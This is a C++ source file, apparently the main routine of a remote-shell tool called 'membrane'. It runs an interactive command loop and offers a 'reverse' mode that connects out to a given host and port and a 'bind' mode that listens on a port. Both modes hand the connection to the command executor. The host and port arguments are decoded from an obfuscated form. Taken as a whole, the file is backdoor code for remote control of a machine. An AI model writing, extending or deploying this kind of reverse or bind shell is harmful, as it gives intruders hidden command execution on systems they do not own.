#include "crypto.hpp"

void repeater()
{
    while (1) {
        console_log("membrane% ", 0);

        std::vector<std::string> commands = membrane_read();
        if (commands.empty())
            continue;
        else {
            if (commands[0] == "exit" || commands[0] == "quit")
                break;

            if (membrane_execute(commands) < 0)
                console_log_error("Unrecognized command!");
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc > 1) {
        std::string host, port;

        if (std::string(argv[1]) == "reverse") {
            if (argc >= 4) {
                host = uncrypto(argv[2]);
                port = uncrypto(argv[3]);
            } else if (argc >= 3) {
                host = "127.0.0.1";
                port = uncrypto(argv[2]);
            } else {
                console_log("Usage: membrane [reverse [host] <port>|bind <port>]");
                return -1;
            }

            int sock = membrane_connect(host, std::stoi(port));
            if (sock >= 0)
                repeater();

            close(sock);
        } else if (std::string(argv[1]) == "bind") {
            if (argc >= 3)
                port = uncrypto(argv[2]);
            else {
                console_log("Usage: membrane [reverse [host] <port>|bind <port>]");
                return -1;
            }

            int sock = membrane_listen(std::stoi(port));
            if (sock >= 0)
                repeater();

            close(sock);
        }
    } else
        repeater();
    return 0;
}
